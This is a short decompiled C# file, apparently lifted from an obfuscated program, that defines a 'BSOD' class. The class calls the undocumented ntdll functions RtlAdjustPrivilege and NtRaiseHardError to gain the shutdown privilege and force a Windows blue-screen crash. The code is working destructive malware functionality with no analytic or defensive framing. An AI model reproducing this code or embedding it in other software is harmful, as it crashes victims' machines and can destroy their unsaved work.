using System;
using System.Runtime.InteropServices;

namespace ṧ
{
	// Token: 0x02000003 RID: 3
	internal class BSOD
	{
		// Token: 0x06000039 RID: 57
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);

		// Token: 0x0600003A RID: 58
		[DllImport("ntdll.dll")]
		private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

		// Token: 0x0600003B RID: 59 RVA: 0x000022AC File Offset: 0x000004AC
		public static bool RaisePrivilege()
		{
			bool flag;
			return BSOD.RtlAdjustPrivilege(19, true, false, out flag) == 0U;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000022CC File Offset: 0x000004CC
		public static bool CauseNtHardError()
		{
			uint num2;
			uint num = BSOD.NtRaiseHardError(-1073741790, 0U, 0U, IntPtr.Zero, 6U, out num2);
			return num == 0U;
		}
	}
}
